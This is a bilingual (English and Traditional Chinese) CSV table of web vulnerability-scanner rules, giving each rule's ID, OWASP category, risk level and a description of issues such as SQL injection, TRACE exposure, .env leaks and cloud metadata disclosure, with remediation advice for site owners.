id,type,origin,enabled,risk,cost,name_en,name_zh,desc_en,desc_zh,advice_en,advice_zh
40013,A7,Session Fixation,TRUE,,,,,,,,
40014,A3,Cross Site Scripting (Persistent),TRUE,,,,,,,,
40016,A3,Cross Site Scripting (Persistent) - Prime,TRUE,,,,,,,,
40017,A3,Cross Site Scripting (Persistent) - Spider,TRUE,,,,,,,,
40018,A3,SQL Injection,TRUE,High,Medium,SQL Injection,資料庫注入攻擊,"We detected that your website has SQL Injection vulnerabilities. This allow attackers to spoof identity, tamper with existing data, cause repudiation issues such as voiding transactions or changing balances, allow the complete disclosure of all data on the system, destroy the data or make it otherwise unavailable, and become administrators of the database server. SQL injection happens when a website includes input data in a SQL query without sufficiently validating it. As a result, an attacker may submits a SQL query via the input data to alter the execution of predefined SQL commands.","檢測到您的網站可能有資料庫注入攻擊的安全風險。
常見於駭客輸入預期之外但符合SQL語法的命令來竄改 SQL 查詢的指令，從而繞過訪問限制直接操作資料庫，可能造成資料外洩、帳密失竊。 當一個網頁將使用者任意輸入的資訊未經處理或是過濾便嵌入其SQL 查詢的程式碼中，將導致駭客可以利用此漏洞注入惡意 SQL 查詢程式碼，進而獲得資料庫任意讀取或寫入權限，都可稱之為 SQL 注入攻擊。","• Perform input validation on all data using, for example, regular expressions perform other checks.
• Use prepared statements with variable binding (aka parameterized queries) to write database queries. This forces the developer to first define all the SQL code, and then pass in each parameter to the query later, regardless of what user input is supplied.
• Encode user input to prevent speical characters from being evaluated as commands. 
• When a SQL query error has occured, avoid showing the error messages on the website. This allows an attacker to fingerprint your database using such information leakage. 
• Minimize the privileges assigned to every database account in your environment to minimize the damage of a successful SQL injection attack.","•檢查輸入的資料是否為期望的資料格式，可使用正規表達式或其他方法進行過濾，防止預期外的輸入。 
•不要直接拼接 SQL 查詢語法，而是使用資料庫或第三方套件提供的參數化查詢接口。
•對使用者的輸入進行轉義或是編碼處理，避免含有特殊字符的字串被當作指令解析。
•發生 SQL 查詢語法錯誤時，避免直接將錯誤訊息或是 SQL 查詢結果顯示於頁面上，防止駭客透過此洩露資訊進行攻擊。 
•限制用戶對資料庫的存取權限，僅給予最低能滿足需求的權限，進而減少此攻擊對資料庫的危害。"
40019,A3,SQL Injection - MySQL,TRUE,High,Medium,SQL Injection,資料庫注入攻擊,"We detected that your website has SQL Injection vulnerabilities. This allow attackers to spoof identity, tamper with existing data, cause repudiation issues such as voiding transactions or changing balances, allow the complete disclosure of all data on the system, destroy the data or make it otherwise unavailable, and become administrators of the database server. SQL injection happens when a website includes input data in a SQL query without sufficiently validating it. As a result, an attacker may submits a SQL query via the input data to alter the execution of predefined SQL commands.","檢測到您的網站可能有資料庫注入攻擊的安全風險。
常見於駭客輸入預期之外但符合SQL語法的命令來竄改 SQL 查詢的指令，從而繞過訪問限制直接操作資料庫，可能造成資料外洩、帳密失竊。 當一個網頁將使用者任意輸入的資訊未經處理或是過濾便嵌入其SQL 查詢的程式碼中，將導致駭客可以利用此漏洞注入惡意 SQL 查詢程式碼，進而獲得資料庫任意讀取或寫入權限，都可稱之為 SQL 注入攻擊。","• Perform input validation on all data using, for example, regular expressions or strconv() to transform the data and perform other checks 
• Use prepared statements with variable binding (aka parameterized queries) to write database queries. This forces the developer to first define all the SQL code, and then pass in each parameter to the query later, regardless of what user input is supplied. For example, use PreparedStatement() in Java, SqlCommand() or OleCommand() in .NET, and sqlite3_prepare() in SQLite. 
• Encode user input to prevent speical characters from being evaluated as commands. 
• When a SQL query error has occured, avoid showing the error messages on the website. This allows an attacker to fingerprint your database using such information leakage. 
• Minimize the privileges assigned to every database account in your environment to minimize the damage of a successful SQL injection attack.","•檢查輸入的資料是否為期望的資料格式，可使用正規表達式或其他方法進行過濾，防止預期外的輸入。 
•不要直接拼接 SQL 查詢語法，而是使用資料庫或第三方套件提供的參數化查詢接口。
•對使用者的輸入進行轉義或是編碼處理，避免含有特殊字符的字串被當作指令解析。
•發生 SQL 查詢語法錯誤時，避免直接將錯誤訊息或是 SQL 查詢結果顯示於頁面上，防止駭客透過此洩露資訊進行攻擊。 
•限制用戶對資料庫的存取權限，僅給予最低能滿足需求的權限，進而減少此攻擊對資料庫的危害。"
40020,A3,SQL Injection - Hypersonic SQL,TRUE,,Medium,SQL Injection,資料庫注入攻擊,"We detected that your website has SQL Injection vulnerabilities. This allow attackers to spoof identity, tamper with existing data, cause repudiation issues such as voiding transactions or changing balances, allow the complete disclosure of all data on the system, destroy the data or make it otherwise unavailable, and become administrators of the database server. SQL injection happens when a website includes input data in a SQL query without sufficiently validating it. As a result, an attacker may submits a SQL query via the input data to alter the execution of predefined SQL commands.","檢測到您的網站可能有資料庫注入攻擊的安全風險。
常見於駭客輸入預期之外但符合SQL語法的命令來竄改 SQL 查詢的指令，從而繞過訪問限制直接操作資料庫，可能造成資料外洩、帳密失竊。 當一個網頁將使用者任意輸入的資訊未經處理或是過濾便嵌入其SQL 查詢的程式碼中，將導致駭客可以利用此漏洞注入惡意 SQL 查詢程式碼，進而獲得資料庫任意讀取或寫入權限，都可稱之為 SQL 注入攻擊。","• Perform input validation on all data using, for example, regular expressions perform other checks.
• Use prepared statements with variable binding (aka parameterized queries) to write database queries. This forces the developer to first define all the SQL code, and then pass in each parameter to the query later, regardless of what user input is supplied.
• Encode user input to prevent speical characters from being evaluated as commands. 
• When a SQL query error has occured, avoid showing the error messages on the website. This allows an attacker to fingerprint your database using such information leakage. 
• Minimize the privileges assigned to every database account in your environment to minimize the damage of a successful SQL injection attack.","•檢查輸入的資料是否為期望的資料格式，可使用正規表達式或其他方法進行過濾，防止預期外的輸入。 
•不要直接拼接 SQL 查詢語法，而是使用資料庫或第三方套件提供的參數化查詢接口。
•對使用者的輸入進行轉義或是編碼處理，避免含有特殊字符的字串被當作指令解析。
•發生 SQL 查詢語法錯誤時，避免直接將錯誤訊息或是 SQL 查詢結果顯示於頁面上，防止駭客透過此洩露資訊進行攻擊。 
•限制用戶對資料庫的存取權限，僅給予最低能滿足需求的權限，進而減少此攻擊對資料庫的危害。"
40021,A3,SQL Injection - Oracle,TRUE,High,Medium,SQL Injection,資料庫注入攻擊,"We detected that your website has SQL Injection vulnerabilities. This allow attackers to spoof identity, tamper with existing data, cause repudiation issues such as voiding transactions or changing balances, allow the complete disclosure of all data on the system, destroy the data or make it otherwise unavailable, and become administrators of the database server. SQL injection happens when a website includes input data in a SQL query without sufficiently validating it. As a result, an attacker may submits a SQL query via the input data to alter the execution of predefined SQL commands.","檢測到您的網站可能有資料庫注入攻擊的安全風險。
常見於駭客輸入預期之外但符合SQL語法的命令來竄改 SQL 查詢的指令，從而繞過訪問限制直接操作資料庫，可能造成資料外洩、帳密失竊。 當一個網頁將使用者任意輸入的資訊未經處理或是過濾便嵌入其SQL 查詢的程式碼中，將導致駭客可以利用此漏洞注入惡意 SQL 查詢程式碼，進而獲得資料庫任意讀取或寫入權限，都可稱之為 SQL 注入攻擊。","• Perform input validation on all data using, for example, regular expressions or strconv() to transform the data and perform other checks 
• Use prepared statements with variable binding (aka parameterized queries) to write database queries. This forces the developer to first define all the SQL code, and then pass in each parameter to the query later, regardless of what user input is supplied. For example, use PreparedStatement() in Java, SqlCommand() or OleCommand() in .NET, and sqlite3_prepare() in SQLite. 
• Encode user input to prevent speical characters from being evaluated as commands. 
• When a SQL query error has occured, avoid showing the error messages on the website. This allows an attacker to fingerprint your database using such information leakage. 
• Minimize the privileges assigned to every database account in your environment to minimize the damage of a successful SQL injection attack.","•檢查輸入的資料是否為期望的資料格式，可使用正規表達式或其他方法進行過濾，防止預期外的輸入。 
•不要直接拼接 SQL 查詢語法，而是使用資料庫或第三方套件提供的參數化查詢接口。
•對使用者的輸入進行轉義或是編碼處理，避免含有特殊字符的字串被當作指令解析。
•發生 SQL 查詢語法錯誤時，避免直接將錯誤訊息或是 SQL 查詢結果顯示於頁面上，防止駭客透過此洩露資訊進行攻擊。 
•限制用戶對資料庫的存取權限，僅給予最低能滿足需求的權限，進而減少此攻擊對資料庫的危害。"
40022,A3,SQL Injection - PostgreSQL,TRUE,High,Medium,SQL Injection,資料庫注入攻擊,"We detected that your website has SQL Injection vulnerabilities. This allow attackers to spoof identity, tamper with existing data, cause repudiation issues such as voiding transactions or changing balances, allow the complete disclosure of all data on the system, destroy the data or make it otherwise unavailable, and become administrators of the database server. SQL injection happens when a website includes input data in a SQL query without sufficiently validating it. As a result, an attacker may submits a SQL query via the input data to alter the execution of predefined SQL commands.","檢測到您的網站可能有資料庫注入攻擊的安全風險。
常見於駭客輸入預期之外但符合SQL語法的命令來竄改 SQL 查詢的指令，從而繞過訪問限制直接操作資料庫，可能造成資料外洩、帳密失竊。 當一個網頁將使用者任意輸入的資訊未經處理或是過濾便嵌入其SQL 查詢的程式碼中，將導致駭客可以利用此漏洞注入惡意 SQL 查詢程式碼，進而獲得資料庫任意讀取或寫入權限，都可稱之為 SQL 注入攻擊。","• Perform input validation on all data using, for example, regular expressions or strconv() to transform the data and perform other checks 
• Use prepared statements with variable binding (aka parameterized queries) to write database queries. This forces the developer to first define all the SQL code, and then pass in each parameter to the query later, regardless of what user input is supplied. For example, use PreparedStatement() in Java, SqlCommand() or OleCommand() in .NET, and sqlite3_prepare() in SQLite. 
• Encode user input to prevent speical characters from being evaluated as commands. 
• When a SQL query error has occured, avoid showing the error messages on the website. This allows an attacker to fingerprint your database using such information leakage. 
• Minimize the privileges assigned to every database account in your environment to minimize the damage of a successful SQL injection attack.","•檢查輸入的資料是否為期望的資料格式，可使用正規表達式或其他方法進行過濾，防止預期外的輸入。 
•不要直接拼接 SQL 查詢語法，而是使用資料庫或第三方套件提供的參數化查詢接口。
•對使用者的輸入進行轉義或是編碼處理，避免含有特殊字符的字串被當作指令解析。
•發生 SQL 查詢語法錯誤時，避免直接將錯誤訊息或是 SQL 查詢結果顯示於頁面上，防止駭客透過此洩露資訊進行攻擊。 
•限制用戶對資料庫的存取權限，僅給予最低能滿足需求的權限，進而減少此攻擊對資料庫的危害。"
40023,A1,Possible Username Enumeration,TRUE,,,,,,,,
40024,A3,SQL Injection - SQLite,TRUE,High,Medium,SQL Injection,資料庫注入攻擊,"We detected that your website has SQL Injection vulnerabilities. This allow attackers to spoof identity, tamper with existing data, cause repudiation issues such as voiding transactions or changing balances, allow the complete disclosure of all data on the system, destroy the data or make it otherwise unavailable, and become administrators of the database server. SQL injection happens when a website includes input data in a SQL query without sufficiently validating it. As a result, an attacker may submits a SQL query via the input data to alter the execution of predefined SQL commands.","檢測到您的網站可能有資料庫注入攻擊的安全風險。
常見於駭客輸入預期之外但符合SQL語法的命令來竄改 SQL 查詢的指令，從而繞過訪問限制直接操作資料庫，可能造成資料外洩、帳密失竊。 當一個網頁將使用者任意輸入的資訊未經處理或是過濾便嵌入其SQL 查詢的程式碼中，將導致駭客可以利用此漏洞注入惡意 SQL 查詢程式碼，進而獲得資料庫任意讀取或寫入權限，都可稱之為 SQL 注入攻擊。","• Perform input validation on all data using, for example, regular expressions perform other checks.
• Use prepared statements with variable binding (aka parameterized queries) to write database queries. This forces the developer to first define all the SQL code, and then pass in each parameter to the query later, regardless of what user input is supplied.
• Encode user input to prevent speical characters from being evaluated as commands. 
• When a SQL query error has occured, avoid showing the error messages on the website. This allows an attacker to fingerprint your database using such information leakage. 
• Minimize the privileges assigned to every database account in your environment to minimize the damage of a successful SQL injection attack.","•檢查輸入的資料是否為期望的資料格式，可使用正規表達式或其他方法進行過濾，防止預期外的輸入。 
•不要直接拼接 SQL 查詢語法，而是使用資料庫或第三方套件提供的參數化查詢接口。
•對使用者的輸入進行轉義或是編碼處理，避免含有特殊字符的字串被當作指令解析。
•發生 SQL 查詢語法錯誤時，避免直接將錯誤訊息或是 SQL 查詢結果顯示於頁面上，防止駭客透過此洩露資訊進行攻擊。 
•限制用戶對資料庫的存取權限，僅給予最低能滿足需求的權限，進而減少此攻擊對資料庫的危害。"
40025,A1,Proxy Disclosure,TRUE,Medium,Medium,Insecure HTTP Method： TRACE,不安全的HTTP方法（Trace）,"We detected that your website allows the HTTP TRACE or 
TRACK method, which leaks the technology and version information of deployed servers. This information may help an attacker identify potentially exploitable server versions and unnecessarily open ports for further attacks. If there exists an out-of-date of unpatched server, an attacker may leverage such vulnerabilities to exploit external services. The TRACE method is often used for debugging purposes, as the server returns in the response all the information it received. This includes cookies, credentials, and other information on the frontend and backend. If the request passed through any proxy servers which may add headers, the TRACE response will also include those. In addition, since the TRACE method reflects the original request, it may be used with cross-domain scripting attacks, resulting in Cross Site Tracing (CST) attacks",檢測到您的網站服務器允許使用 TRACE 方法，該方法會洩漏已部署的伺服器技術和版本消息導致產生安全風險。 例如攻擊者在TRACE後發現有漏洞的Server版本或是該Server開啟了不必要的port導致私密的Server可以被攻擊者訪問，進而導致攻擊的發生。​ 除此之外，駭客也可以利用返回的資訊了解伺服器技術和版本資訊，進一步列出攻擊目標列表與漏洞，若伺服器中存在過期或未修補的服務，則將被駭客進一步滲透。 TRACE 方法是 HTTP 定義的一種協議除錯方法，該方法使得伺服器原樣返回任何用戶請求的內容，包含前後端資訊、 cookie、或身份驗證資料等敏感資訊以及附加的路由中間的代理伺服器的資訊，由於該方法原樣返回用戶提交的任意資料，因此可用來進行跨域腳本攻擊。這種攻擊方式又稱為跨域跟蹤攻擊（XST），可能導致帳戶盜用、資料外洩。,"• Disable the 'TRACE' method on the proxy servers, as well as the origin web/application server. 
• Disable the 'OPTIONS' method on the proxy servers, as well as the origin web/application server, if it is not required for other purposes, such as 'CORS' (Cross Origin Resource Sharing). 
• Configure the web and application servers with custom error pages, to prevent 'fingerprintable' product-specific error pages being leaked to the user in the event of HTTP errors, such as 'TRACK' requests for non-existent pages. 
• Configure all proxies, application servers, and web servers to prevent disclosure of the technology and version information in the 'Server' and 'X-Powered-By' HTTP response headers.","• 建議在代理伺服器以及原始Web /應用程序伺服器上禁用TRACE method。​ 
• 建議在代理伺服器以及原始Web /應用程序伺服器上禁用OPTIONS method，防止攻擊者藉由OPTIONS的查詢來檢查網站是否支援TRACE。​ 
• 如果已禁用TRACE method，建議在網站中使用自定義錯誤頁面，防止攻擊者往不存在的頁面發送TRACE請求時，預設的錯誤頁面洩露過多資訊。"
40026,A3,Cross Site Scripting (DOM Based),TRUE,,,,,,,,
40027,A3,SQL Injection - MsSQL,TRUE,High,Medium,SQL Injection,資料庫注入攻擊,"We detected that your website has SQL Injection vulnerabilities. This allow attackers to spoof identity, tamper with existing data, cause repudiation issues such as voiding transactions or changing balances, allow the complete disclosure of all data on the system, destroy the data or make it otherwise unavailable, and become administrators of the database server. SQL injection happens when a website includes input data in a SQL query without sufficiently validating it. As a result, an attacker may submits a SQL query via the input data to alter the execution of predefined SQL commands.","檢測到您的網站可能有資料庫注入攻擊的安全風險。
常見於駭客輸入預期之外但符合SQL語法的命令來竄改 SQL 查詢的指令，從而繞過訪問限制直接操作資料庫，可能造成資料外洩、帳密失竊。 當一個網頁將使用者任意輸入的資訊未經處理或是過濾便嵌入其SQL 查詢的程式碼中，將導致駭客可以利用此漏洞注入惡意 SQL 查詢程式碼，進而獲得資料庫任意讀取或寫入權限，都可稱之為 SQL 注入攻擊。","• Perform input validation on all data using, for example, regular expressions perform other checks.
• Use prepared statements with variable binding (aka parameterized queries) to write database queries. This forces the developer to first define all the SQL code, and then pass in each parameter to the query later, regardless of what user input is supplied.
• Encode user input to prevent speical characters from being evaluated as commands. 
• When a SQL query error has occured, avoid showing the error messages on the website. This allows an attacker to fingerprint your database using such information leakage. 
• Minimize the privileges assigned to every database account in your environment to minimize the damage of a successful SQL injection attack.","•檢查輸入的資料是否為期望的資料格式，可使用正規表達式或其他方法進行過濾，防止預期外的輸入。 
•使用資料庫或第三方套件提供的參數化查詢接口，避免直接拼接 SQL 查詢語法。
•對使用者的輸入進行轉義或是編碼處理，避免含有特殊字符的字串被當作指令解析。
•發生 SQL 查詢語法錯誤時，避免直接將錯誤訊息或是 SQL 查詢結果顯示於頁面上，防止駭客透過此洩露資訊進行攻擊。 
•限制用戶對資料庫的存取權限，僅給予最低能滿足需求的權限，進而減少此攻擊對資料庫的危害。"
40028,A3,ELMAH Information Leak,TRUE,Medium,Low,Information Leak：Trace.axd ,資料揭露（Trace.axd文件）,"We detected that your website leaks the Trace.axd file, which may disclose an significant amount of information, including business logic, credentials, session cookies, or other sensitive data. To view diagnostic information and tracing messages in an ASP.NET web application, developers may enable tracing to follow a page's execution path and additional debugging information, which is then exported to a Trace.axd file. Developers can then display this file using a Trace Viewer to investigate errors. However, this file should be hidden or removed from production stages.","檢測到您的網站有Trace.axd文件揭露的安全風險。
常見於文件未隱藏而使攻擊者探尋到後根據文件利用資訊洩漏包括業務邏輯，憑證，session cookie或其他敏感數據等進行攻擊。 Trace.axd是為了ASP.NET Web應用程序中查看診斷信息和跟蹤消息，開發人員可以啟用使其遵循頁面的執行路徑和其他調試訊息，進而導出到Trace.axd文件使開發人員可查看此文件以調查錯誤。","• Hide or remove Trace.axd in production stages. 
• Disable the Trace Viewer unless it is actually required in development. Ensure access to it requires authentication and authorization. 
• To disable ASP.NET tracing, apply the following changes to your web.config file： <System.Web> <trace enabled=""""false"""" /> </System.Web>","• 應將此文件隱藏或從生產階段中刪除，因為它可能洩漏大量信息。 
• 請考慮研發過程中是否實際需要Trace Viewer，如果不需要，則將其禁用。 
• 若不禁用，請確保任何人進行存取時需要身份驗證和授權。 要禁用ASP.NET跟踪，請將以下更改應用於web.config文件： <System.Web> <trace enabled=""""false"""" /> </System.Web>。"
40029,A1,Trace.axd Information Leak,TRUE,,,,,,,,
40032,A3,.htaccess Information Leak,TRUE,Medium,Low,Information Leak：.htaccess,資料揭露（.htaccess 文件）,htaccess files can be used to alter the configuration of the Apache Web Server software to enable/disable additional functionality and features that the Apache Web Server software has to offer.,檢測到您的網站可能有.htaccess文件揭露的風險。 .htaccess文件是用於記錄及更改Apache Web Server的配置＆啟用或禁用Apache Web Server中的其他功能。 因此攻擊者一但拿到此文件便可能從中獲取Server配置進行針對性的攻擊以及從中獲取機敏資料（遠端IP位置、遠端URL等）,Ensure the .htaccess file is not accessible. ,"• 確認網站上.htaccess 檔案的存取權限，確保使用者無法下載.htaccess 。
• 設定完成後以報告中路徑測試，再次確認使用者無法存取檔案"
40034,A1,.env Information Leak,TRUE,Medium,Low,Information Leak：.env,資料揭露（.env文件）,"One or more .env files seems to have been located on the server. These files often expose infrastructure or administrative account credentials, API or APP keys, or other sensitive configuration information.",檢測到您的網站有.env文件揭露的風險，這可能導致敏感資訊外洩，因為此類型文件通常保管網頁基礎結構架構或管理帳戶憑證或其他敏感配置信息。,Ensure the .env file is not accessible.,• 確認掃描報告中列出的文件，確認此文件有公開的必要，否則則移除此類型文件，確保資料沒有洩漏的風險。
40035,A1,Hidden File Finder,TRUE,,,,,,,,
50000,Other,Script Active Scan Rules,TRUE,,,,,,,,
50001,Other,Script Passive Scan Rules,TRUE,,,,,,,,
50003,Other,Stats Passive Scan Rule,TRUE,,,,,,,,
90001,A4,Insecure JSF ViewState,TRUE,,,,,,,,
90011,Other,Charset Mismatch,TRUE,,,,,,,,
90017,A3,XSLT Injection,TRUE,Medium,Medium,XSLT Injection,XSLT注入攻擊,"Injection using XSL transformations may be possible, and may allow an attacker to read system information, read and write files, or execute arbitrary code.","檢檢測到您的網站可能有XSLT注入攻擊的風險。
常見於應用程序允許上傳任意XSLT文件，且未設置好針對使用者的輸入進行驗證，導致XSLT轉換時將使用者輸入內容變成指令注入，因而使讓攻擊者遠程取得儲存在本地Web Server中的文件內容，可能是包含了憑證資訊配置或敏感訊息的文件等。 XSLT是一種可以將XML資料檔轉換為另外的XML或其它格式如HTML網頁、純文字的語言。而XSLT 注入風險通常是因為未設置好針對使用者的輸入進行驗證，因而導致風險發生。",Sanitize and analyze every user input coming from any client-side.,"• 盡量不使用使用者提供的XSLT檔案匯入 。
• 網站中的輸入欄位針對XSLT語法進行過濾 。"
90019,A3,Server Side Code Injection,TRUE,,,,,,,,
90020,A3,Remote OS Command Injection,TRUE,High,Medium,Remote OS Command Execution,系統命令遠端執行,"Attack technique used for unauthorized execution of operating system commands. This attack is possible when an application accepts untrusted input to build operating system commands in an insecure manner involving improper data sanitization, and/or improper calling of external programs.Attack technique used for unauthorized execution of operating system commands. This attack is possible when an application accepts untrusted input to build operating system commands in an insecure manner involving improper data sanitization, and/or improper calling of external programs.",檢測到您的網站可能使攻擊者遠端執行系統命令在作業系統上。常見於攻擊者透過表單、Cookie、Http表頭等位置嘗試將系統命令注入作業系統，導致系統崩潰中斷服務或是竊取資料建立後門等。 此種攻擊除了因為系統的設置不當或權限設定不明確以外，通常也代表網站針對使用者的輸入驗證不足，導致攻擊者可以成功遠端執行系統指令。 ,"If at all possible, use library calls rather than external processes to recreate the desired functionality. Run your code in a 'jail' or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by your software.","• 做好輸入驗證與檢查，不論是前後端都應假設輸入都是惡意且不可信任的 
• 檢查文法與語意，應確認每個輸入欄位是否為合理的資料類型與內容，例如年齡的欄位在文法上應只接受0-9的數字，而語意上應確認此數字介於 0-120。 
• 難以定義文法的自由格式，都應經由編碼轉義為純字符串來處理，防止此內容被視為程式碼執行。許多程式框架都有提供內建編碼函式庫，可多加利用。"
90021,A3,XPath Injection,TRUE,,,,,,,,
90022,A1,Application Error Disclosure,TRUE,Medium,Medium,Error Message Leakage,錯誤信息揭露,"We detected that your website leaks error messages with detailed descriptions. This vulnerability may disclose sensitive information like the location of the file that produced the unhandled exception and the internal logic of the source code. Attackers may use this information to fingerprint and launch further attacks against the web application, such as substituting existing files to execute malicious code. The alert could be a false positive if the error message is found inside a documentation page.","檢測到您的網站頁面包含一條錯誤/警告消息，該消息可能會洩露敏感信息，造成安全風險。 例如發現紀錄異常的文件位置，內容包含網頁結構及資料夾名稱，導致攻擊者可藉此針對網頁進行資料探尋、替換等攻擊行為。 錯誤信息可用於對網頁應用程序發起進一步的攻擊。 
如果在網頁文字內容中有含錯誤消息等關鍵字，可能導致本項目產生誤報。","• Review the source code of this page. 
• Implement custom error pages. Consider implementing a mechanism to provide a unique error reference/identifier to the client (browser) while logging the details on the server side and not exposing them to the user.","• 查看此頁面的原始碼，並自定義錯誤頁面。 
• 當發生錯誤時將資料（錯誤參考碼/識別碼）記錄在伺服器端，而不向用戶公開。"
90023,A5,XML External Entity Attack,TRUE,,,,,,,,
90024,A4,Generic Padding Oracle,TRUE,Medium,Low,Error Message Containing Sensitive Information,錯誤訊息中包含敏感資訊,"By manipulating the padding on an encrypted string, an attacker is able to generate an error message that indicates a likely ‘padding oracle’ vulnerability. Such a vulnerability can affect any application or framework that uses encryption improperly, such as some versions of ASP.net, Java Server Faces, and Mono. An attacker may exploit this issue to decrypt data and recover encryption keys, potentially viewing and modifying confidential data. This rule should detect the MS10-070 padding oracle vulnerability in ASP.net if CustomErrors are enabled for that.","檢測到您的網站可能有錯誤訊息中包含敏感資訊的可能。
常見於引用的某些版本應用程序或框架的加密不正確或是版本過舊，導致當攻擊者針對應用程序或框架進行密文填充的溢位攻擊時，錯誤訊息中包含了敏感資訊的洩漏。","Update the affected server software, or modify the scripts so that they  properly validate encrypted data before attempting decryption.","• 將顯示的錯誤訊息隱藏確保攻擊者無法查看錯誤訊息中的敏感資訊。
• 將顯示錯誤訊息的應用程序或框架版本更新至最新或安全的穩定版本。 "
90025,A3,Expression Language Injection,TRUE,,,,,,,,
90026,Other,SOAP Action Spoofing,TRUE,,,,,,,,
90027,A1,Cookie Slack Detector,TRUE,Low,Low,Cookies Not Enforced,未被採用的 cookie,"Repeated GET requests： drop a different cookie each time, followed by normal request with all cookies to stabilize session, compare responses against original baseline GET. This can reveal areas where cookie based authentication/attributes are not actually enforced.",檢測到您的網站實際上未執行Cookie，使網站缺乏預期的驗證功能。 這可能導致攻擊者在不被驗證的情況下存取需執行身份驗證範圍的資訊。,Check the report for the area that actually performs the cookie verification function,• 檢查報告列表中為實際執行Cookie驗證功能的區域。
90028,A1,Insecure HTTP Method,TRUE,,,,,,,,
90029,Other,SOAP XML Injection,TRUE,,,,,,,,
90030,A5,WSDL File Detection,TRUE,,,,,,,,
90033,A8,Loosely Scoped Cookie,TRUE,,,,,,,,
90034,Other,Cloud Metadata Potentially Exposed,TRUE,Medium,Medium,Cloud Metadata Disclosure,雲端中繼資料洩漏,"The Cloud Metadata Attack attempts to abuse a misconfigured 
NGINX server in order to access the instance metadata maintained by cloud service providers such as AWS, GCP and Azure. All of these providers provide metadata via an internal unroutable IP address ‘169.254.169.254’ - this can be exposed by incorrectly configured NGINX servers and accessed by using this IP address in the Host header field.",檢測到您的網站可能因為Nginx的配置錯誤導致雲端上的中繼資料洩漏。 常見於Nginx的配置過於寬鬆使攻擊者可以透過Nginx訪問原先沒有權限存取的Server進而使AWS，GCP和Azure等雲服務提供商的中繼資料洩漏，中繼資料可能是檔案種類和其它技術資訊，以及誰有權限存取,Do not trust any user data in NGINX configs. In this case it is probably the use of the $host variable which is set from the 'Host' header and can be controlled by an attacker.,"• 將流量代理到已知上游Server，通過IP地址或DNS名稱來標識Server進行過濾。 
• 在NGINX配置中或使用Web應用程序防火牆（WAF），將所有帶有異常標頭值的請求丟棄。"
